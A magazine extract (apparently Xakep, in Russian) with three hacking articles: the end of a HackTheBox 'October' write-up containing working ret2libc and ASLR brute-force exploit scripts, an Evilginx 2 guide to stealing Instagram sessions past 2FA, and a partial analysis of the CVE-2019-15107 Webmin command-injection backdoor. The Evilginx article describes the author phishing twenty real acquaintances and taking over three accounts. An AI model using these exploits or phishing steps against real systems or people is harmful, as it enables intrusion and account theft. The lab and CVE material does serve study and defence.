переполнить. Я сгенерирую и передам уни каль ный паттерн из 200 байт,
а после рассчитаю точ ку переза писи адреса воз вра та по текуще му значению
регистра EIP.





             Расчет смещения до регистра EIP в PEDA GDB



  gdb‐peda$ pattern offset 0x41384141
  1094205761 found at offset: 112


Итак, перезапись EIP начина ется с 112‐го байта. Запомним это. Теперь нам
нужно получить четыре клю чевых зна чения:
 • адрес загрузки библиотеки libc;
 • величины смещений отно ситель но базового адреса libc до библиотеч‐
   ных функций system и exit;
 • величину смещения относительно базового адреса libc до строки
  "/bin/sh".

Сделать это можно не одним способом, и я продемонстрирую по два воз‐
можных варианта на каждый пункт.


Ад рес загрузки libc
Первый вариант получения адреса загрузки биб лиотеки libc мы уже рас‐
сматривали — достаточно прос то воспользоваться шелл‐скриптом ldd.



  $ ldd ovrflw | grep libc
  libc.so.6 => /lib/i386‐linux‐gnu/libc.so.6 (0xb7e09000)


Адрес libc.so.6 — 0xb7e09000.
  Другой способ — обра титься  к файловой системе procfs с целью
получить отображение памяти, которую использует процесс ovrflw. Для это‐
го «заморозим» выполнение программы в GDB и запросим маппинг памяти.



  gdb‐peda$ b main      # break main
  gdb‐peda$ r           # run
  gdb‐peda$ i proc map  # info proc mappings





              Смотрим отоб ражение памяти в отладчике

В этом случае по тому же адресу загрузится биб лиотека libc‐2.23.so (а
не libc.so.6), которая используется в GDB и содержит дополнительную
отладочную информацию. Одна ко общий смысл оста ется неизменным.
   Эти же данные можно получить из файла /proc/<ovrflw_PID>/maps.





                      То же самое через procfs


Сме щения до фун кций system и exit
Величины смещений функций относитель но базового адреса libc можно
запросить с помощью утилиты readelf, если применить ее к самой биб‐
лиотеке с флагом ‐s (отоб ражает таб лицу символов запрошенного фай ла).



  $ readelf ‐s /lib/i386‐linux‐gnu/libc.so.6 | grep ‐e ' system@' ‐e '
  exit@'
  141:  0002e9d0    31 FUNC    GLOBAL DEFAULT   13 exit@@GLIBC_2.0
  1457: 0003ada0    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0


Выбрав интересующую нас информа цию по клю чевым словам system@
и exit@, мы получили два зна чения смещения: 0x0003ada0 для system
и 0x0002e9d0 для exit.
   Как вариант, чтобы получить адреса нуж ных нам функций, можно исполь‐
зовать команду print отладчика GDB. Загрузив ovrflw для отладки, ана‐
логично просмотру маппинга памяти выставим точку останова на main, запус‐
тим программу и вытащим адреса.



  gdb‐peda$ b main
  gdb‐peda$ r
  gdb‐peda$ p system  # print system
  $1 = {<text variable, no debug info>} 0xb7e43da0 <__libc_system>
  gdb‐peda$ p exit    # print exit
  $2 = {<text variable, no debug info>} 0xb7e379d0 <__GI_exit>


Замечу, что в данном слу чае мы получили абсолютные значения адресов фун‐
кций system и exit (0xb7e43da0, 0xb7e379d0 соот ветственно), а не их отно‐
сительные смещения.


Сме щение до стро ки "/bin/sh"
Если речь идет о поиске строк в Linux, очевидно, не обойдется без утилиты
strings.



  $ strings ‐atx /lib/i386‐linux‐gnu/libc.so.6 | grep '/bin/sh'
  15ba0b /bin/sh


Флаг ‐a необходим для поиска по всему файлу, а ‐t x задает формат вывода
адреса (шестнадцатеричный в нашем случае).
  Другой способ получения адреса "/bin/sh" — это поиск «в лоб». В клас‐
сическом GDB такой поиск реализуется командой find.



  (gdb) b main
  (gdb) r
  (gdb) find 0xb7e09000, +9999999, "/bin/sh"
  0xb7f64a0b
  warning: Unable to access 16000 bytes of target memory at 0xb7fbe793,
  halting search.
  1 pattern found.
  (gdb) x/s 0xb7f64a0b
  0xb7f64a0b:     "/bin/sh"


Здесь я указываю начальный адрес для поиска, максимальное смещение
относительно его и паттерн, который нужно най ти. После чего командой ана‐
лиза содержимого (x/s) убеждаюсь, что по адресу 0xb7f64a0b действитель‐
но находится строка "/bin/sh".
  Однако  ассистент  PEDA  предлага ет  более  удобный  поиск  строк
с помощью встроенной питоновской команды searchmem.



  gdb‐peda$ b main
  gdb‐peda$ r
  gdb‐peda$ searchmem '/bin/sh'
  Searching for '/bin/sh' in: None ranges
  Found 1 results, display max 1 items:
  libc : 0xb7f64a0b ("/bin/sh")


В этом случае я получаю нужный результат в одно действие.


Экспло ит
Теперь у тебя есть все, чтобы оформить эксплоит на Python.


#!/usr/bin/env python
# ‐*‐ coding: utf‐8 ‐*‐


# Использование: python exploit_no_aslr.py


import struct
from subprocess import call


def little_endian(num):
    """Упаковка адреса в формат little endian."""
    return struct.pack('<I', num)


junk = "A" * 112            # Мусор


libc_addr = 0xb7e09000      # Базовый адрес libc


system_offset = 0x0003ada0  # Смещение функции system
exit_offset = 0x0002e9d0    # Смещение функции exit
sh_offset = 0x0015ba0b      # Смещение строки "/bin/sh"


system_addr = little_endian(libc_addr + system_offset)
exit_addr = little_endian(libc_addr + exit_offset)
sh_addr = little_endian(libc_addr + sh_offset)


payload = junk + system_addr + exit_addr + sh_addr


call(['./ovrflw', payload])





                                 exploit_no_aslr.py

Таким образом, мы обошли защиту от выполнения кода в стеке. Сама по себе
защита DEP не может помешать атаке ret2libc, так как в данном слу чае мы
привлекаем существующий в адресном прос транстве машинный код.
   Усложнить эксплуатацию подобного рода поз воляет технология ран‐
домизации размещения адресного пространс тва ASLR, благодаря которой
адрес  загрузки стандартной биб лиотеки в память меняется с каждым
вызовом программы. На 64‐битных архитектурах это решение и правда силь‐
но затрудняет жизнь «низкоуровневому» нарушителю, однако на 32‐битных
системах адрес libc довольно легко можно подоб рать, если не ограничено
количество разрешенных запусков уязвимого исполня емого файла.


Об ход ASLR — метод «гру бой силы»
Активируем ASLR и взглянем на то, как меняются адреса загрузки libc, снова
выпол нив скрипт ldd в цикле.



  $ sudo sh ‐c 'echo 2 > /proc/sys/kernel/randomize_va_space'





  Изменение адресов загрузки libc на локальном стенде с активным ASLR

На моем стенде, равно как и на ВМ October, зна чительным изменениям под‐
вергается всего один байт (третий и четвертый разряды адреса, представ‐
ленного в шестнадцатеричной записи, начиная отсчет с нуля) и один бит (в
пятом разряде, где мы видим всего два различных зна чения).





                 Количество адресов для перебора

В квадратных скоб ках я отметил количес тво возможных вариантов для данной
позиции, исходя из размышлений выше. Следовательно, если я возьму
наугад случайный адрес из тех 512 значений, которые могут «выпасть», то я
получу шанс 1 ‐ (511/512) ≈ 0,2% угадать правильный адрес libc. Однако
если я запущу тот же самый экс плоит 1000 раз, то мои шансы на успех
повысятся до 1 ‐ (511/512)^1000 ≈ 85,84%, что звучит намного более
оптимистично.
  Модифицируем наш скрипт, обернув вызов программы в цикл.


#!/usr/bin/env python
# ‐*‐ coding: utf‐8 ‐*‐


# Использование: python exploit.py


import struct
from subprocess import call


def little_endian(num):
    """Упаковка адреса в формат little endian."""
    return struct.pack('<I', num)


junk = "A" * 112            # Мусор


libc_addr = 0xb7e09000      # Базовый адрес libc


system_offset = 0x0003ada0  # Смещение функции system
exit_offset = 0x0002e9d0    # Смещение функции exit
sh_offset = 0x0015ba0b      # Смещение строки "/bin/sh"


system_addr = little_endian(libc_addr + system_offset)
exit_addr = little_endian(libc_addr + exit_offset)
sh_addr = little_endian(libc_addr + sh_offset)


payload = junk + system_addr + exit_addr + sh_addr


for i in range(1, 1001):
    print 'Try: %s' % i
    call(['./ovrflw', payload])

После запуска перебора на 155‐й попытке мне вернулся шелл.





                                       exploit.py


В БОЕВЫХ УСЛОВИЯХ
Снова переместившись в сес сию на October, я проделаю то же самое, чтобы
получить нужные мне значения адресов памяти.





           Получение необ ходимых адресов на ВМ October

И проведу эксплуатацию прямо из Bash.





              Финальный экс плоит в одну стро ку

Я ожидал, что перебор займет хотя бы нес колько минут, но на шестой попыт‐
ке уязвимый бинарь уже сдался.
  На этом все, «Октябрь» пройден!





                             Трофей
ВЗЛОМ
КОМБАЙН
 ДЛЯ ФИШИНГА





      КАК EVILGINX 2 ИСПОЛЬЗУЮТ
        ДЛЯ КРАЖИ АККАУНТОВ




В этой статье мы изучим, как работает
реверс‐прокси Evilginx 2, и на примере In‐
stagram посмотрим, как с его помощью уво‐
дят аккаунты в обход двухфакторной аутен‐
тификации. Поднимем боевой стенд, нас‐                  8bit                                                                                                   vegelin47@mail.ru
троим   все   необходимые   параметры
и закинем удочку с наживкой посочнее. Уже
клюет! Подсекай!


ПОДНОГОТНАЯ ОБМАННЫХ МАНЕВРОВ
Для защиты аккаунтов крупные онлайн‐сервисы используют двухфакторную
аутентификацию (2FA). Обычно ее реализация сводится к тому, что помимо
логина и пароля нужно ввести одноразовый код, при сылаемый в SMS
или push‐уведомлении на номер мобильного, ука занный при регистрации.
До недавних пор 2FA считалась сравнительно надежной противоугонной сис‐
темой, однако сейчас уже есть готовые инс трументы, поз воляющие легко
преодолевать ее.


             INFO

                     После выхода статьи о Modlishka наш почетный
                        читатель и временами автор Bo0oM оставил ком‐
                      ментарий: «Но есть же evilginx?». Это подтолкнуло
                     меня  к  исследованию  данного  инструмента
                      и написанию статьи.


Один из них — Evilginx 2, о котором мы и поговорим. Это обратный прок‐
си‐сервер и готовый фреймворк для выполнения MITM‐атаки с целью обхода
двухфакторной аутентификации. В нем автоматизировано все, что только
можно. Как же он работает?
  В общем случае для удачной ата ки фишеру необходимо вклиниться между
жертвой и запрашиваемым ей сайтом, перехватить учетные данные, а заодно
распознать и сох ранить cookies сес сии. Сделать это при обычной авториза‐
ции по HTTP было сравнитель но просто, но с переходом сайтов на HTTPS
и 2FA потребовало концепту ально других методов.
   У Evilginx 2 есть суперспособ ность создавать под писанный сертификат
для фейкового сайта при помощи клиента бес платного и пол ностью авто‐
матизированного удостоверя ющего центра Let’s Encrypt. Это помогает ата‐
кующей стороне использовать HTTPS и укра сить фишинговый сайт зеленым
замочком в адресной строке. В итоге подделка получается визу ально неот‐
личимой от оригинала (по крайней мере, на первый взгляд). Плюс к этому
Evilginx 2 самостоятельно определяет и перехватывает валидные «печеньки»,
а это — главная составляющая успешного взло ма.
   Дальше уже вопрос смекалки фишера. Например, получив доступ к одно‐
му аккаунту, ты создаешь от его имени группу или рассылку с просьбой про‐
голосовать в каком‐нибудь конкурсе. Друзья переходят по твоей ссылке, а ты
собираешь учет ки голосу ющих — и площадь атаки растет в геометрической
прогрессии.


КАК СОЗДАВАЛСЯ ЗЛОЙ ПРОКСИ
Автор описываемого инстру мента — польский этичный хакер Куба Грецки
kgretzky. Первое упомина ние об Evilginx (на тот момент еще первой версии)
в его блоге датировано 6 апреля 2017 года.
  Первоначально за основу он взял два модуля популярного веб‐сервера
Nginx: sub_ﬁlter и proxy_pass. В Evilginx первый модуль блокиру ет дос туп жер‐
твы к реальному ресурсу, а второй переда ет перехваченные запросы на тре‐
буемый сервер и обратно. Уже на тот момент программа представлялась
как инструмент, который способен пробить защиту 2FA.
   Разработчика пригласили для выс тупления на конференцию WarCon 2018,
где его заметил Кевин Митник. Он на писал про  Evilginx, что послужило
отличной рекламой. Evilginx начал быс тро набирать популярность. К июню
того же года было выпущено два релиза Evilginx — 1.0 и 1.1.
  На все том же WarCon 2018 Куба Грецки поз накомился с ведущим спе‐
циалистом по информационной безопасности итальянской фирмы Zimperi‐
um — «белым хакером» Симоне Маргарителли, публикующим свои иссле‐
дования под псевдонимом evilsocket. Маргарител ли показал ему все прелес‐
ти языка Go и вдох новил переписать Evilginx. Год спустя вышел пол ностью
переработанный Evilginx 2. Проект эво люционировал от идеи MITM through
Nginx до «Evilginx 2 w/o Nginx. Pure Go, and pure  evil». Это был первый
переломный момент.
   Второй наступил, когда свет увидел опенсорсный проект Modlishka. На тот
момент сложность использования Evilginx 2 заключалась в проксировании
трафика. Необходимо было писать множес тво фильтров, которые динамичес‐
ки заменяли ссылки на фишинговые. Делалось это методом проб и ошибок,
что сильно усложняло код.
  Затем Куба Грецки увидел, как реализована подмена URL в Modlishka.
Оказалось, что не обязательно писать тонны своих фильтров — достаточно
один раз добавить домен сайта и прописать общие правила подмены тра‐
фика. Это было рождение компонентов phishlets — готовых скриптов для ими‐
тации структуры популярных сайтов. На данный момент мы можем восполь‐
зоваться Evilginx версии уже 2.3.1.


EVILGINX 2 VS MODLISHKA
В моей предыдущей статье был разоб ран дру гой инстру мент для обхода
двухфакторной аутентификации — Modlishka. На тот момент в нем не было
автоматизированного решения проблемы с HTTPS и сертификатом, так что
закручивать эту гайку приходилось самому. Да и запустить на нем можно
было лишь один фишинговый сайт, что снижает практический эффект атаки.
    Evilginx 2 лишен этих недос татков. На таком «комбайне для фишинга» мож‐
но запустить перехват учетных данных с нес коль ких сервисов одновременно
(подробнее об этом ниже). К тому же готовое решение с сертификатом силь‐
но развязывает руки. На мой взгляд, Evilginx 2 опережает Modlishka на нес‐
колько шагов из‐за грамотного подхода и максимального удобства исполь‐
зования.
  На данный момент проект претерпел несколько релизов и продолжает
развиваться. Например, в последних обновлениях были добавлены JS‐инъ‐
екции. Они позволяют внедрять в тра фик свои скрип ты на JS, которые выпол‐
нятся на машине жертвы.
  Я привык, что все хакерские утилиты пишут для Linux, однако Evilginx 2 дос‐
тупен и в Windows, и в виде контейнера Docker. К моему удивлению, в «окнах»
он работает ничуть не хуже, а его установка оказалась даже проще, чем
на Linux. Просто скачиваем архив, распаковываем его в любой каталог
и запускаем экзешник. Да, это портейбл‐утилита, которую можно записать
хоть на флешку и запускать в Windows, начиная с версии 7. Она не требует
установки и не оставляет следов в реестре.





                                  Evilginx 2 в Windows

Редактировать файл .yml мож но из «Блокнота».





Вижу, как у тебя зачесались руки, давай перейдем от слов к делу. Только
заниматься этим будем все же в Linux.


ГОТОВИМ БОЕВОЙ СТЕНД
Задача сле дующая: под нять в интернете сервер с Evilginx 2 и перехватить
несколько экземпляров учетных данных от популярной социальной сети.
   Начнем с того, что нам нужна VDS с минимальными системны ми требова‐
ниями. У меня были одно ядро с гигабайтом оперативной памяти и 30 Гб жес‐
ткого диска плюс белый IP‐адрес. На борту — Ubuntu 16.04. Конечно же, нуж‐
но зарегать домен, привязанный к этому IP. Вот толь ко сделать это бесплатно
в излюбленном месте халявщиков — freedom — не получится. Необходимо
иметь не одно доменное имя, а доменную зону, которую тебе делегируют. Ее
можно купить у провайдера, например REG.RU. При покупке домена в ком‐
плекте идет управле ние DNS, где ты и можешь записью DNS А прикрепить
доменное имя к IP‐адресу или наделать поддоменов, которые могут при‐
годиться для развития атаки.
  Идем на новоиспеченный сервер и первым делом ставим среду раз работ‐
ки для языка Go, так как второй Evilginx написан на нем.


sudo add‐apt‐repository ppa:longsleep/golang‐backports
sudo apt‐get update
sudo apt‐get install golang‐go
export GOPATH=$HOME/go
export PATH=$PATH:/usr/local/go/bin:$GOPATH/bin

Проверяем, все ли взлетело:


go env

Должен быть явно указан путь GOPATH.





                  Вывод терминала env GO

Теперь ставим сам Evilginx 2


apt‐get install git make
go get ‐u github.com/kgretzky/evilginx2
cd $GOPATH/src/github.com/kgretzky/evilginx2
make
make install

Перед запуском надо проверить, не заняты ли у нас порты 80 и 443. Они нуж‐
ны для проксирования трафика. Я подумал, что в чистой ОС они должны быть
свободны, и ошибся. 80 порт занял предус тановленный Apache, из‐за чего
не смог автоматом сгенерироваться сертификат.


netstat –antp





              Проверяем прослушива емые порты ОС

После того, как необ ходимые порты осво бождены, можно запус тить сам сер‐
вер, просто написав его имя в консоли — evilginx.





                      Ин терфейс Evilginx

Если после запуска сра зу перейти на фишинговый сайт по его доменному
имени, то программа просто перенап равит посетителя на видеохостинг
Youtube. Это действие задано по умолчанию, а нуж ное тебе ты можешь выс‐
тавить в настройках. Что бы увидеть нас тройки, набираем config.





                   Дефолтная конфигура ция

В конфиге поле domain должно соот ветс твовать нашему фишинговому
домену, IP —  его  IP‐адресу. Параметр redirect_url —  это домен,
на который будет переброшена жертва, которая перейдет по чистой ссылке.
Задать настройки можно следующими командами:


config domain yourDomain.com
config ip yourIP

Теперь немного об устройстве всей этой станции. Опи раться придется
на две сущности.
   Phishlets — это конфигурационные фай лы, зада ющие правила основной
работы Evilginx. В них ука зывается, по каким параметрам опре делять авто‐
ризацию, как выглядят cookie‐сессии и все осталь ные данные для удачного
фишинга. Находятся они в одноименном каталоге рядом с программой
и имеют расширение .yaml  . Всего их уже написано 13 штук для разных
популярных сайтов, а скоро наверняка появятся еще. Главное, что можно
написать свои. Есть две версии формата написания: для релиза 2.2.0 и для
версии 2.3.0, принимаются пока обе. Они слегка отличаются синтакси сом
и возможностями. Для каждой из них имеется очень подробное описание.





               Вид конфигурационного файла phishlets

Помимо фишлетов, в Evilginx есть набор ловушек (lures). Это программные
функции, которые генерируют ссылки, разруливая подмену трафика и его
движение внутри самой хост‐машины в зависимости от того, куда мы хотим
направить жертву.
  Перед тем как перей ти к работе, стоит уточнить еще один момент:
в домашнем каталоге должна появиться скрытая директория с названием
инструмента. В ней находится основной конфиг (параметры, которые мы ука‐
зывали), база дан ных (там будут пойманные креды и сес сии) плюс сертификат
с ключом. Если залезть в потроха сертифика та, то станет видно, что он кор‐
невой, выдан сроком на 10 лет и подписан как Evilginx Super‐Evil Root
CA. Чтобы вывести информацию о нем, необ ходимо воспользоваться коман‐
дой


openssl x509 ‐in ca.crt  ‐text





                   Ин формация сертификата


             INFO

                        Cовет:  если  ты  будешь  использовать  VDS
                      и захочешь после отключения от SSH‐сессии вер‐
                         нуться к запущен ному Evilginx, используй окон‐
                     ный менеджер с поддержкой терминальных сеан‐
                       сов Screen.


Переходим к основной работе. Первым делом нам необходимо нас троить
фишлеты. Я буду использовать фишлет для Instagram. Чтобы увидеть все кон‐
фиги, просто вводим команду phishlets. Пока они пустые. Добавляем наш
домен к выбранному конфигу:


phishlets hostname instagram yourDomain

Теперь создаем ловушку для пользователей «Инсты»:


lures create instagram

В итоге все должно выглядеть как на скрин шоте ниже.





                Программа, подготов ленная к запуску

Запускаем один или нес колько фишлетов:


phishlets enable Instagram



                       Запуск программы

Что происходит? Во‐первых, генерируется сертификат (это как раз тот
момент, когда все может рас сыпаться как карточный дом, если будут
заняты 80 или 443 порты). Генерирует ся он при помощи встроенной прог‐
раммы Let's Encrypt, так что получается, что на фишинговый домен тебе выдан
валидный (спаси нас всех великий Админ) сертификат! Это решает проблему
с HTTPS‐соединением и правдоподобностью всего происходящего.
   Во‐вторых, происходит запуск самого прокси‐сервера, изначально пос‐
троенного на популярном веб‐сервере Nginx. Сей час он переписан на Go,
однако символическое наз вание оста лось. Начина ется прослушка трафика
и фильтрация содержимого по заданным конфигура циям фишлетов.
   Чтобы увидеть все ловушки, надо набрать: lures. Обрати внимание
на таблицу и стол бец id. Для получения готовой фишинговой ссылки вводим
lures get‐url id, где id — это цифра из таб лицы.


ТЕСТИРУЕМ СЕРВЕР
Перед тем как заманивать жертву по ссылке, надо протес тировать наш сер‐
вер и уточнить некоторые детали. Заходим сами по фишинговой ссылке
и видим перед собой стра ницу с предложением авто ризоваться в Instagram.
Все выглядит убедительно. Вводим логин, пароль и код из SMS. Отлично,
роль жертвы исполнена!
  В это же время на сервере происхо дит вот что: в терминале будет хорошо
видно, что кто‐то посещал твою страницу. При перехвате аутентификацион‐
ных данных они сразу отобразятся. Как только креды перехвачены, они
записываются в базу данных. Увидеть их можно, введя команду sessions.





                 Перехваченный логин и пароль

Но как же быть с 2FA? В тот момент, когда жертва вводит пароль из SMS‐
сообщения, Evilginx 2 перехватывает еще и сес сию авторизации, или cookie.
Если в терминале Evilginx появилась строка: «all authorization tokens intercept‐
ed!», это как раз говорит об успешном захвате сес сии. Увидеть статус перех‐
вата можно, набрав команду session id.





                        Сессия жертвы

Чтобы импортировать сессию в бра узер, можно воспользоваться плагином
EditThisCookie. Все, теперь мы авторизованы в Instagram от имени жертвы,
а логин и пароль нам вообще не нужны!


ПЕРВЫЕ ЖЕРТВЫ
Остается последний этап — проверка боем. Я разослал двадцати знакомым
из своего списка контактов сообщение с фишинговой ссылкой и фразой
«Прикольно придумали!».





                  Пример фишинговой рас сылки

Эти люди меня знали, а большинс тво авто матичес ки доверяют знакомым.
К тому же есть элемент интриги. Интересно же узнать, что там такого при‐
думано? Тем более в WhatsApp автоматически добавилось превью веб‐стра‐
ницы с логотипом Instagram.
   Эти  два  аспекта  я  брал  как  опорные  точки  атаки.  В  итоге
из 20 человек 16 перешли по ссылке и трое решились ввести логин и пароль.
Скорее всего, остальные поленились их вспомнить, так как пользуются
«Инстаграмом» через приложение и не авторизу ются в нем каждый раз.
Никаких воп росов мне не задава ли и сомнений в безопасности процедуры
не выражали.





                      Результат «рыбал ки»

Когда три человека слили свои креды и ничего необычного по ссыл ке
не обнаружили, они спро сили: «Что же там такого?». Я прос то ответил: «Уже
ничего. Наверное, это была тестовая шту ковина». На этом все сомнения раз‐
веялись. Во все три акка унта я мог войти без пароля, используя сессии. Так
что 2FA больше не защищала их.
  Важный момент: поскольку большинс тво пользователей смотрят Instagram
через приложение, пос ле фишинговой атаки у меня остается длительный
доступ. Сессия авториза ции живет до того момента, пока пользователь
заново не зайдет по фишинговой ссылке или не выйдет из аккаунта. Обе
ситуации маловероятны. Учитывая эти практические аспекты, держать вир‐
туальную свечку у жертвы над головой можно очень и очень дол го.


ЗАЩИТА
У меня был тестовый стенд, поднятый с целью демонстрации воз можнос тей
Evilginx 2. Поэто му я не стал замора чиваться с обфускацией атаки и нак‐
ладывать дополнительные слои для запуты вания — все было поднято на раз
и на голом скелете. Как показала практика, даже в таком виде атака успешно
работает.
   Какие‐либо технические меры для защиты от подобных атак придумать
сложно. Тем более что авторизация через соцсети может быть встроена
на любой сайт. Поэто му главным «антивирусом» будет обычный принцип
разумного сомнения. Если ты перехо дишь по прис ланной ссылке, а в итоге
открывается приглашение ввести данные своей учет ки в Instagram (или дру‐
гом сервисе), в голове должен раз давать ся тревож ный звонок.


        WWW

                    •Описание и работа Evilginx 2
                    •Описание DNS
                    •Использование Evilginx 2
ВЗЛОМ





        ЛАЗЕЙКА
       В WEBMIN





         КАК РАБОТАЕТ БЭКДОР
   В ПАНЕЛИ УПРАВЛЕНИЯ СЕРВЕРОМ




В популярной панели управления сервером
Webmin обнаружилась уязвимость, которая
больше  всего  похожа  на  оставленную
кем‐то закладку. Ата кующий в результате
может   выполнять   произвольный   код                aLLy                                                                                    ONsec
на целевой сис теме с правами суперполь‐              @iamsecurity
зователя.  Давай  посмотрим,  как  это
работает,  в чем  заключа ется проблема
и как с ней бороться.


Webmin полностью написан на  Perl, без использования нестандартных
модулей. Он состоит из прос того веб‐сервера и нес кольких скриптов — они
связывают команды, обеспечивающие исполнение команд, которые поль‐
зователь отдает в веб‐интерфейсе, на уровне опе раци онной системы
и внешних программ. Через веб‐админку можно создавать новые учетные
записи пользователей, почтовые ящики, изменять настройки служб и разных
сервисов и все в таком духе.
   Уязвимость находится в модуле восста новления пароля. Манипу лируя
параметром old в скрипте password_change.cgi, атакующий может выпол‐
нять произвольный код на целевой системе с правами суперпользователя,
что наводит на мысли об умышленном характере этого бага. Что еще подоз‐
рительнее — проб лема присутствует только в готовых сборках дис трибутива
с SourceForge, а в исходниках на GitHub ее нет.


             INFO

                       Уязвимость получила иден тификатор CVE‐2019‐
                       15107.



СТЕНД
Для демонстрации уязвимости нам понадобятся две версии дис трибутива
Webmin — 1.890 и 1.920, так как тестовые окружения для них немного раз‐
личаются. Для этого воспользуемся двумя контейнерами Docker.


$ docker run ‐it ‐‐rm ‐p10000:10000 ‐‐name=webminrce18 ‐‐hostname=
webminrce18.vh debian /bin/bash
$ docker run ‐it ‐‐rm ‐p20000:10000 ‐‐name=webminrce19 ‐‐hostname=
webminrce19.vh debian /bin/bash

Теперь установим необходимые зависимос ти.


$ apt‐get update ‐y && apt install ‐y perl libnet‐ssleay‐perl
openssl libauthen‐pam‐perl libpam‐runtime libio‐pty‐perl nano wget
python apt‐show‐versions

Во время установки apt‐show‐versions у меня возникла проблема (на
скриншоте ниже).





          Проб лема при установке apt‐show‐versions через apt

Следующие команды помога ют ее устра нить:


$ apt‐get purge ‐y apt‐show‐versions
$ rm /var/lib/apt/lists/*lz4
$ apt‐get ‐o Acquire::GzipIndexes=false update ‐y
$ apt install ‐y apt‐show‐versions

После   этого   скачива ем   соответс твующие   версии   дистрибутивов
с SourceForge.


$ wget http://prdownloads.sourceforge.net/webadmin/webmin_1.890_all.
deb
$ wget http://prdownloads.sourceforge.net/webadmin/webmin_1.920_all.
deb

И устанавливаем их.


$ dpkg ‐‐install webmin_1.890_all.deb
$ dpkg ‐‐install webmin_1.920_all.deb





               Установка обеих версий Webmin закончена

Теперь запускаем демоны Webmin.


$ service webmin start

Версия 1.890 доступна на дефолтном порте 10000, а 1.920 — на 20000.





               Готовые к эксплуата ции стенды с Webmin

Осталось только установить пароль для пользователя root при помощи
команды passwd, и стенды готовы. Переходим к деталям уязвимос ти.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
   ЛАЗЕЙКА В WEBMIN
                             КАК РАБОТАЕТ БЭКДОР
                В ПАНЕЛИ УПРАВЛЕНИЯ СЕРВЕРОМ





ДЕТАЛИ
Сначала разберемся с версией 1.920. Проб лема — в функции смены пароля,
а сама она находится в файле password_change.cgi. Так как проблема зат‐
ронула только версию приложения с SourceForge, можно легко узнать, в чем
разница с той, что лежит на GitHub.





  Разница между файлами password_change.cgi в Webmin вер‐
  сии 1.920 с GitHub и SourceForge

Видим, что добавлен вызов функции qx.


webmin-1.920-github/password_change.cgi
40:     $enc eq $wuser‐>{'pass'} || &pass_error($text{'password_eold'
});


webmin-1.920-sourceforge/password_change.cgi
40:     $enc eq $wuser‐>{'pass'} || &pass_error($text{'password_eold'
},qx/$in{'old'}/);

Интересные изменения. Но не будем спешить, сначала разберемся, как доб‐
раться до этой части кода.
  В начале скрипта про веря ется, какой режим парольной политики выбран
в настройках.


password_change.cgi
12: $miniserv{'passwd_mode'} == 2 || die "Password changing is not
enabled!";

Авторизуемся в панели управления Webmin как root и зай дем в настройки
аутентификации (Webmin → Webmin Conﬁguration → Authentication), здесь
нужно найти пункт Password expiry policy и установить его в Prompt users with
expired passwords to enter a new one.





           Меняем парольную полити ку в Webmin 1.920

Теперь переменная passwd_mode имеет значение 2, что можно проверить
в конфигурационном файле, и выполнение скрипта не будет прерываться
на строке 12.





       Значение настройки passwd_mode в конфиге Webmin 1.920

Чтобы наглядно увидеть форму для изменения пароля, давай перейдем
в раздел редактирования пользователей и соз дадим тестового юзе ра. Здесь
установим опцию Force change at next login.





             Создание тестового пользователя в Webmin

Теперь при авторизации от его имени система попросит установить новый
пароль. Данные этой формы как раз и будут отправлены на скрипт pass‐
word_change.cgi.





             Форма изменения пароля пользователя

Итак, заполним форму, отправим и перехватим запрос. Теперь возвращаем‐
ся к скрипту. Массив $in содержит пользовательские данные, которые
передаются в теле запроса POST.


password_change.cgi
15: $in{'new1'} ne '' || &pass_error($text{'password_enew1'});
16: $in{'new1'} eq $in{'new2'} || &pass_error($text{'password_enew2'
});

Здесь проверяется, что новый пароль установлен (переменная new1) и он оба
раза введен верно (new1 == new2).
  Далее Webmin выполняет проверку на наличие и возможность исполь‐
зования модуля acl (access‐control list).


password_change.cgi
19: if (&foreign_check("acl")) {

Если такой модуль есть, то подгружаем его.


20:     &foreign_require("acl", "acl‐lib.pl");

Из названия понятно, что модуль работа ет со списком управления доступом.
Он выполняет разные операции с пользователями: редактирование, изме‐
нение паролей и прав.
   Скрипт выбирает из списка пользователей юзера, которому нужно уста‐
новить новый пароль. Имя пользователя берется из поля user формы смены
пароля.


password_change.cgi
21:     ($wuser) = grep { $_‐>{'name'} eq $in{'user'} } &acl::list_u
sers();

Давай немного поиграем в тестировщиков и посмотрим на переменную
$wuser. Для этого нужно добавить в скрипт включение модуля Data::Dumper,
после чего можно будет выводить информа цию о переменных при помощи
конструкции Dumper($var_name).


password_change.cgi
6:     use Data::Dumper;
...
21:     ($wuser) = grep { $_‐>{'name'} eq $in{'user'} } &acl::list_u
sers(); print Dumper($wuser);





        Отладка переменной $wuser. Свойства пользователя test

В Webmin пользователи бывают двух типов: системные, которые существу ют
непосредственно в ОС, и внутренние юзеры приложения. Список системных
пользователей в Linux ты можешь найти в файле /etc/passwd, именно
из него и берет информа цию Webmin. Поэтому у таких пользователей свой‐
ство pass будет иметь значение x.





  Свойства системного пользователя root. Обрати внимание на перемен‐
  ную pass

Если мы будем исполь зовать такого юзера в форме смены пароля, то это не
позволит нам попасть в нужное условие и доб рать ся до нужного учас тка кода.


$wuser = {
     'name' => 'root',
     'pass' => 'x',
     'readonly' => undef,
     'lastchange' => '',
     'real' => undef,
     'twofactor_apikey' => undef,
     'lang' => 'ru.UTF‐8',
     ...
};


password_change.cgi
22:     if ($wuser‐>{'pass'} eq 'x') {
23:         # A Webmin user, but using Unix authentication
24:         $wuser = undef;
25:         }
...
37: if ($wuser) {
38:     # Update Webmin user's password
39:     $enc = &acl::encrypt_password($in{'old'}, $wuser‐>{'pass'});
40:     $enc eq $wuser‐>{'pass'} || &pass_error($text{'password_eold'
},qx/$in{'old'}/);

Если ты поставишь вывод значения переменной прямо перед условием, то
увидишь, что при попытке изменить пароль сис темному пользователю она
будет иметь значение undef.


password_change.cgi
37: print Dumper($wuser); if ($wuser) {
38:     # Update Webmin user's password
39:     $enc = &acl::encrypt_password($in{'old'}, $wuser‐>{'pass'});





  Состояние переменной wuser при попытке изменить пароль системного
  пользователя

Однако не все так плохо. Если указать несуществу ющего пользователя, то
переменная станет пустой, но не неопределен ной. И в таком слу чае условие
if ($wuser) будет считать ся истиной.


password_change.cgi
37: print Dumper($wuser); if ($wuser) {
38:     # Update Webmin user's password
39:     die 'We are here!'; $enc = &acl::encrypt_password($in{'old'},
 $wuser‐>{'pass'});





  Указываем имя несуществующего пользователя, чтобы попасть к нуж‐
  ному участку кода

Здесь  старый  пароль,  который мы переда ли  в форме,  сравнивается
с текущим паролем поль зователя. Естественно, эта часть выражения будет
